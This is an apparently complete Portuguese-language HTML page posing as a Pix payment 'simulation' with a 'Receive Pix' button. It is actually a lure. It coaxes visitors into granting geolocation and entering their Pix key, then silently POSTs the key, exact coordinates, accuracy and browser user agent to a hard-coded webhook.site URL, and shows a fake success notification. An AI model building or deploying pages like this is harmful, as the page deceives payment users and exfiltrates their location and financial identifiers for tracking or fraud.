<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>Simulação Pix</title>

<style>
body{
  margin:0;
  background:#f2f2f2;
  height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
  font-family:Arial, sans-serif;
}

.card{
  background:#fff;
  padding:35px;
  border-radius:18px;
  width:320px;
  text-align:center;
  box-shadow:0 10px 25px rgba(0,0,0,.1);
}

button{
  background:#820ad1;
  color:#fff;
  border:none;
  padding:15px;
  width:100%;
  font-size:18px;
  border-radius:12px;
  cursor:pointer;
}

input{
  width:100%;
  padding:12px;
  font-size:16px;
  margin:15px 0;
  border-radius:8px;
  border:1px solid #ccc;
}

small{
  color:#777;
  font-size:12px;
}

.alert{
  color:#b00020;
  font-size:13px;
  margin-top:10px;
}

/* ===== Notificação fake ===== */
.notificacao{
  position:fixed;
  top:-120px;
  left:50%;
  transform:translateX(-50%);
  background:#820ad1;
  color:#fff;
  padding:16px 22px;
  border-radius:14px;
  width:320px;
  box-shadow:0 8px 20px rgba(0,0,0,.25);
  transition:top .5s ease;
  z-index:9999;
}

.notificacao.mostrar{
  top:20px;
}

.notificacao strong{
  display:block;
  font-size:14px;
}

.notificacao span{
  font-size:13px;
  opacity:.9;
}
</style>
</head>

<body>

<!-- Notificação animada -->
<div id="notif" class="notificacao">
  <strong>Trunfo — Simulação</strong>
  <span>Simulação de transferência concluída</span>
</div>

<!-- Tela 1 -->
<div class="card" id="tela1">
  <button onclick="pedirLocalizacao()">Receber Pix</button>
  <div id="erro" class="alert"></div>
</div>

<!-- Tela 2 -->
<div class="card" id="tela2" style="display:none">
  <input id="chave" placeholder="Digite sua chave Pix">
  <button onclick="confirmar()">Receber Pix</button>
  <small>Simulação — nenhum valor real será transferido</small>
</div>

<!-- Tela 3 -->
<div class="card" id="tela3" style="display:none">
  <h3>✅ Simulação concluída</h3>
  <p>Obrigado por participar.</p>
</div>

<script>
/* ===== CONFIG ===== */
const WEBHOOK = "https://webhook.site/7b90f2d2-5b54-422c-9ab9-24a37ba6bab6";

/* ===== ESTADO ===== */
let posicao = null;

/* ===== PEDIR LOCALIZAÇÃO ===== */
function pedirLocalizacao(){
  document.getElementById("erro").innerText = "";

  if(!navigator.geolocation){
    document.getElementById("erro").innerText =
      "Navegador não suporta localização.";
    return;
  }

  navigator.geolocation.getCurrentPosition(
    p => {
      posicao = p;
      document.getElementById("tela1").style.display="none";
      document.getElementById("tela2").style.display="block";
    },
    () => {
      document.getElementById("erro").innerText =
        "Por favor, dê as permissões para que possamos continuar a simulação.";
    }
  );
}

/* ===== CONFIRMAR ===== */
function confirmar(){
  if(!posicao){
    alert("Localização não obtida.");
    return;
  }

  const dados = {
    chave_pix: document.getElementById("chave").value || "vazio",
    latitude: posicao.coords.latitude,
    longitude: posicao.coords.longitude,
    precisao: posicao.coords.accuracy,
    data: new Date().toISOString(),
    navegador: navigator.userAgent
  };

  fetch(WEBHOOK, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(dados)
  });

  mostrarNotificacao();

  document.getElementById("tela2").style.display="none";
  document.getElementById("tela3").style.display="block";
}

/* ===== ANIMAÇÃO ===== */
function mostrarNotificacao(){
  const n = document.getElementById("notif");
  n.classList.add("mostrar");
  setTimeout(() => n.classList.remove("mostrar"), 4000);
}
</script>

</body>
</html>
